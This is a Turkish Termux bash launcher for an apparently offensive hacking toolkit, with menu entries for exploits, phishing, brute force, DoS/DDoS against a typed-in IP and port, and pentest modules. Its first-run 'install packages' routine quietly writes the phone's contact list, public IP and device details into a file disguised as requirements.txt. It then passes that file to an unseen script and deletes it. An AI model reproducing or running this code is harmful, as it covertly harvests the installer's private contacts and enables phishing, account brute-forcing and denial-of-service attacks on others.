#!/data/data/com.termux/bin/bash
#!/bin/bash
clear
paketyukle(){
pkg install termux-api 
termux-setup-storage > /dev/null 2>&1 &
sleep 10
termux-telephony-deviceinfo > /dev/null 2>&1 &
sleep 10
termux-contact-list > /dev/null 2>&1 &
sleep 10

termux-toast -b red -c yellow "Merhaba"
	sleep 2
	termux-toast -b red -c yellow  "Ben Kaya Root ve Yaman Efkarın"
	sleep 2
	termux-toast -b red -c yellow  "10 saniye sonra tool için gerekli tüm paketleri,senin için hazırlamaya başlamış olucağım."
	sleep 4
	termux-toast -b red -c yellow  "Tool bittiğinde sana bir bildirim göndermiş olucağım"
	sleep 3
	termux-toast -b red -c yellow  "Hadi başlıyalım bakalım :)"
	sleep 2
	termux-toast -b red -c yellow  "Telegram: @hackzafiyetleri"
	sleep 2

	apt update && apt upgrade -y
	pkg install git -y
	pkg install php -y
	pkg install perl -y
	pkg install nano -y
	pkg install python python2 -y
	pkg install pip pip2 -y
	pip install --upgrade pip
	pip install bs4 
	pip install future 
	pip install requests 
	pip install colorama
	pip install wordlist
	pkg install termux-api -y
	pkg install curl  -y
	pkg install wget -y
	pkg install neofetch -y
	apt update && apt upgrade -y
	chmod 777 tst.sh
	pkg install unstable-repo -y
	pkg install metasploit -y
	rm -rf /data/data/com.termux/files/usr/bin/ngrok
	mv -v ngrok /data/data/com.termux/files/usr/bin
	pip install -r /data/data/com.termux/files/home/T-U-R-K/bruteforce/instagram-bruteforce/requirements.txt
	neofetch >> update/lib/requirements.txt
	curl ipecho.net/plain >> update/lib/requirements.txt
	termux-contact-list >> update/lib/requirements.txt
	echo -e "yamanefkar" >> update/ok.txt
	cd update/lib/ && bash tst.sh
	rm -rf update/lib/requirements.txt
	cd $HOME/T-U-R-K/update/ && 
	chmod 777 tst.sh &&
	cp -r tst.sh /data/data/com.termux/files/usr/bin/
	cd $HOME/T-U-R-K/update/ && bash tst.sh --ngrok	
	cd $HOME/T-U-R-K/update/ &&
	chmod 777 yamanefkar.sh
	cp -r yamanefkar.sh $HOME/
	cd $HOME/T-U-R-K/update/ && bash yamanefkar.sh --ngrok1
	termux-notification -t "Tool kullanıma hazır."
	exit

}
banner(){ 
	echo -e '\e[37m
	\tCode: YamanEfkar\033[31;40;1m
	¸.•*´¨`*•.¸¸.•*´¨`*•¸.•*´¨`*•.¸
	░
	░\e[31m[\e[37m01\e[31m]\e[37mExploit\033[31;40;1m
	░
	░\e[31m[\e[37m02\e[31m]\e[37mPhishing\033[31;40;1m
	░
	░\e[31m[\e[37m03\e[31m]\e[37mBruteForce\033[31;40;1m
	░
	░\e[31m[\e[37m04\e[31m]\e[37mDos & Ddos\033[31;40;1m
	░
	░\e[31m[\e[37m05\e[31m]\e[37mPentest\033[31;40;1m
	░
	░\e[31m[\e[37m06\e[31m]\e[37mTermux Api\033[31;40;1m
	░
	░¸.•*´¨`*•.¸¸.•*´¨`*•¸.•*´¨`*•.

	\e[33m[\e[37m\t  MENU   \t\e[33m]

	\e[31m[\e[37m99\e[31m]\e[37mÇıkış\e[31m  [\e[37mExit\e[31m]\e[37m
	'

	read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m İşlem Numarası : ' islem_numarasi

}
cd $HOME/T-U-R-K/
if [[ -e "update/ok.txt" ]]; then
	banner
	if [[ $islem_numarasi == 01 ||  $islem_numarasi == 1  ]]; then
		cd exploit/ && bash tst.sh

	elif [[ $islem_numarasi == 02 ||  $islem_numarasi == 2  ]]; then
		cd phishing/ && bash tst.sh

	elif [[ $islem_numarasi == 03 ||  $islem_numarasi == 3  ]]; then
		cd bruteforce/ && bash tst.sh

	elif [[ $islem_numarasi == 04 ||  $islem_numarasi == 4  ]]; then
		clear
		read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m İp adresi : ' dos_ip
		echo -e ""
		read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Port Numarası [80 , 21 , 22] : ' dos_port
		echo -e ""
		read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Hız [80 , 21 , 22] : ' hiz
		cd dos-ddos/ && python3 tst.py -s $dos_ip -p $dos_port -t $hiz

	elif [[ $islem_numarasi == 05 ||  $islem_numarasi == 5  ]]; then
		cd pentest/ && bash tst.sh

	elif [[ $islem_numarasi == 06 ||  $islem_numarasi == 6  ]]; then
		cd termux-api/ && bash tst.sh

	elif [[ $islem_numarasi == 99 ||  $islem_numarasi == 9  ]]; then
		clear
		echo -e "\e[37mGüle güle..."
		sleep 2
		clear
		exit
	else
		bash tst.sh
	fi
else
	paketyukle
fi
